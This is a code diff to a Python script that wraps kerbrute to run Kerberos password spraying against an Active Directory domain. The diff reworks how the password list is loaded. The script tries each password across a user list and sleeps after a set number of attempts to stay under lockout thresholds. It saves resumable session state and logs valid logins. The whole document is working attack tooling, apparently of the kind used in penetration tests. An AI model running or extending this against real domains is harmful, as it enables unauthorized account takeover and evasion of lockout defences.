@@ -38,6 +38,7 @@ a = args.attempts
 sf = args.session_file
 lf = args.log_file
 seconds = s*60
+passwords = []
 i = 0
 j = args.pwd_line
 k = args.user_line
@@ -53,11 +54,11 @@ if os.path.exists(sf) and os.path.getsize(sf) >= 0:
         session = json.load(f)
         
         print("Resuming previous session:")
+        print(f"  Domain: {session['domain']}")
+        print(f"  Domain IP: {session['domain_ip']}")
         print(f"  Users: {session['users']}")
         print(f"  Passwords: {session['passwords']}")
         print(f"  Sleep time (minutes): {session['sleep']}")
-        print(f"  Domain: {session['domain']}")
-        print(f"  Domain IP: {session['domain_ip']}")
         print(f"  Attempts before sleep: {session['attempts']}")
         print(f"  Current password line: {session['pwd_line']}")
         print(f"  Current user line: {session['user_line']}")
@@ -114,134 +115,130 @@ if k > 0:
 else:
     au = u
 
-with open(au) as f:
+with open(au, 'r') as f:
     total_users = sum(1 for _ in f)
 
-with open (p) as passwords:
-    for _ in range(j):
-        passwords.readline()
-    
-    while True:
-        password = passwords.readline()
-        if not password:
-            print("All passwords have been sprayed. Exiting...")
-            break
-        password = password.strip()
-    
+with open (p, 'r') as password:
+    passwords = [line.strip() for line in password.readlines()]
+
+while j < len(passwords):
+    try:
+        if ip != "":
+            process = subprocess.Popen(
+                [kerbrute_path, "passwordspray", "--verbose", "-d", d, "--dc", ip, au, passwords[j]],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+        else:
+            process = subprocess.Popen(
+                [kerbrute_path, "passwordspray", "--verbose", "-d", d, au, passwords[j]],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True
+            )
+
+        curr_user = 0
+        output_lines = []
         try:
-            if ip != "":
-                process = subprocess.Popen(
-                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, "--dc", ip, au, password],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    text=True
-                )
-            else:
-                process = subprocess.Popen(
-                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, au, password],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT,
-                    text=True
-                )
+            for line in process.stdout:
+                line = line.rstrip()
+                output_lines.append(line)
 
-            curr_user = 0
-            output_lines = []
-            try:
-                for line in process.stdout:
-                    line = line.rstrip()
-                    output_lines.append(line)
-
-                    if "Invalid password" in line or "LOCKED OUT" in line or "not exist" in line:
-                        curr_user += 1
-                        print(f"\r[{curr_user}/{total_users}] {line}", end="", flush=True)
-                    elif "VALID LOGIN" in line:
-                        curr_user += 1
-                        sys.stdout.write(CLEAR_LINE)
-                        print(line)
-                    else:
-                        print(f"\n{line}")
-                    sys.stdout.flush()
-                process.wait()
-            except KeyboardInterrupt:
-                process.terminate()
-                print(f"\nProcess interrupted by user. Resume with --pwd-line {j} and --user-line {curr_user}")
-                
-                with open(sf, "w") as f:
-                    json.dump({
-                        "users": u,
-                        "passwords": p,
-                        "sleep": s,
-                        "domain": d,
-                        "domain_ip": ip,
-                        "attempts": a,
-                        "pwd_line": j,
-                        "user_line": curr_user,
-                        "last_sprayed": (datetime.now() - timedelta(minutes=s+1)).strftime("%Y-%m-%d %H:%M:%S"),
-                        "session_file": sf,
-                        "log_file": lf
-                    }, f, indent=4)
-                
-                with open(lf, "a") as log:
-                    log.write(f"--- Password: {password} ---\n")
-                    pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
-                    filtered = [line for line in output_lines if pattern.search(line)]
-                    log.write("\n".join(filtered) + "\n")
-                    log.flush()
-
-                sys.exit(0)
-            finally:
-                if tu and os.path.exists(tu.name):
-                    os.remove(tu.name)
-                    k = 0
-                    au = u
-                    tu = None
-                    
-                    with open(au) as f:
-                        total_users = sum(1 for _ in f)
-
+                if "Invalid password" in line or "LOCKED OUT" in line or "not exist" in line:
+                    curr_user += 1
+                    print(f"\r[{curr_user}/{total_users}] {line}", end="", flush=True)
+                elif "VALID LOGIN" in line:
+                    curr_user += 1
+                    sys.stdout.write(CLEAR_LINE)
+                    print(line)
+                else:
+                    print(f"\n{line}")
+                sys.stdout.flush()
+            process.wait()
+        except KeyboardInterrupt:
+            process.terminate()
+            print(f"\nProcess interrupted by user. Resume with --pwd-line {j} and --user-line {curr_user}")
+            
+            with open(sf, "w") as f:
+                json.dump({
+                    "users": u,
+                    "passwords": p,
+                    "sleep": s,
+                    "domain": d,
+                    "domain_ip": ip,
+                    "attempts": a,
+                    "pwd_line": j,
+                    "user_line": curr_user,
+                    "last_sprayed": (datetime.now() - timedelta(minutes=s+1)).strftime("%Y-%m-%d %H:%M:%S"),
+                    "session_file": sf,
+                    "log_file": lf
+                }, f, indent=4)
+            
             with open(lf, "a") as log:
-                log.write(f"--- Password: {password} ---\n")
+                log.write(f"--- Password: {passwords[j]} ---\n")
                 pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
                 filtered = [line for line in output_lines if pattern.search(line)]
                 log.write("\n".join(filtered) + "\n")
                 log.flush()
 
-        except subprocess.CalledProcessError as e:
-            print(e)
-            
-        print(f"[Processed: {j}] Sprayed password: {password}")
+            sys.exit(0)
+        finally:
+            if tu and os.path.exists(tu.name):
+                os.remove(tu.name)
+                k = 0
+                au = u
+                tu = None
+                
+                with open(au) as f:
+                    total_users = sum(1 for _ in f)
+
+        with open(lf, "a") as log:
+            log.write(f"--- Password: {passwords[j]} ---\n")
+            pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
+            filtered = [line for line in output_lines if pattern.search(line)]
+            log.write("\n".join(filtered) + "\n")
+            log.flush()
+
+    except subprocess.CalledProcessError as e:
+        print(e)
+        
+    print(f"[Processed: {j}/{len(passwords)}] Sprayed password: {passwords[j]}")
+    sys.stdout.flush()
+    
+    i += 1
+    j += 1
+    
+    with open(sf, "w") as f:
+        json.dump({
+            "users": u,
+            "passwords": p,
+            "sleep": s,
+            "domain": d,
+            "domain_ip": ip,
+            "attempts": a,
+            "pwd_line": j,
+            "user_line": 0,
+            "last_sprayed": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "session_file": sf,
+            "log_file": lf
+        }, f, indent=4)
+
+    if i == a:
+        i = 0
+        print(f"Sleeping for {s} minute(s) after {a} attempt(s)...")
+        print(f"Resume with --pwd-line {j} if interrupted")
         sys.stdout.flush()
         
-        i += 1
-        j += 1
-        
-        with open(sf, "w") as f:
-            json.dump({
-                "users": u,
-                "passwords": p,
-                "sleep": s,
-                "domain": d,
-                "domain_ip": ip,
-                "attempts": a,
-                "pwd_line": j,
-                "user_line": 0,
-                "last_sprayed": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "session_file": sf,
-                "log_file": lf
-            }, f, indent=4)
-
-        if i == a:
-            i = 0
-            print(f"Sleeping for {s} minute(s) after {a} attempt(s)...")
-            print(f"Resume with --pwd-line {j} if interrupted")
-            sys.stdout.flush()
+        remaining_time = seconds
+        while remaining_time > 0:
+            mins, secs = divmod(remaining_time, 60)
+            time_format = f"{mins:02d}:{secs:02d}"
+            print(f"\rTime remaining: {time_format}", end="", flush=True)
+            time.sleep(1)
+            remaining_time -= 1
             
-            remaining_time = seconds
-            while remaining_time > 0:
-                mins, secs = divmod(remaining_time, 60)
-                time_format = f"{mins:02d}:{secs:02d}"
-                print(f"\rTime remaining: {time_format}", end="", flush=True)
-                time.sleep(1)
-                remaining_time -= 1
-                
-            print("\nResuming password spray...")
+        print("\nResuming password spray...")
+        
+        with open (p, 'r') as password:
+            passwords = [line.strip() for line in password.readlines()]
